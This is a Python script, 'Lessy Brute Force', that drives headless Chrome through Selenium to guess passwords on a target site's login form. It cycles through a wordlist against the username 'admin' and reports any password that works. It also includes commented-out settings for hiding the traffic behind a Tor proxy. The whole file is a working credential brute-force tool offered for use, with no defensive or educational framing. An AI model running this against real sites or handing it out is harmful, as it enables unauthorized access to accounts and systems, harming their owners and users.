from selenium import webdriver
from selenium.webdriver.common.by import By
import argparse, sys, os

class LsySelenium():
    def __init__(self):
        self.chrome_driver_path = "C:/chromedriver.exe" # Replace with your own "chromedriver.exe" path.
        
        self.get_args()
        self.make_list()
        self.bruteforce()

    def get_args(self):
        parser = argparse.ArgumentParser(description = 'Lessy Brute Force')
        parser.add_argument('-u', type = str, help = 'Target URL')
        parser.add_argument('-w', type = str, help = 'Wordlist')

        args = parser.parse_args()

        self.url = args.u
        self.wordlist = args.w

    def make_list(self):
        try:
            with open(self.wordlist) as f:
                self.password_list = f.read().split("\n")
        except:
            sys.exit("Usage: lessybruteforce.py -u <url> -w <wordlist>")

    def bruteforce(self):
        counter = 1

        # FOR TOR BROWSER PROXY

        #proxy_host = "127.0.0.1"
        #proxy_port = 9150
        chrome_options = webdriver.ChromeOptions()
        #chrome_options.add_argument("--proxy-server = socks5://{}:{}".format(proxy_host, proxy_port))
        chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(executable_path = self.chrome_driver_path, options = chrome_options)

        os.system("cls")
        os.system("color 4")
        print("Started!")

        for i in self.password_list:
            driver.get(self.url)
            driver.find_element(By.NAME, "username").send_keys("admin") # Replace with website username "input name". And replace "admin" with username.
            driver.find_element(By.NAME, "password").send_keys(i) # Replace with website password "input name".
            driver.find_element(By.XPATH, '/html/body/form/input[3]').click() # Replace with website submit button "XPATH" or "input name".

            if "Success" in driver.page_source: # Replace here.
                print("")
                print(f"Login successul!\nUsername: admin\nPassword: {i}")
                break

            else:
                print(f"{counter} / {len(self.password_list)}", end = "\r")
                counter += 1
        driver.quit()

run = LsySelenium()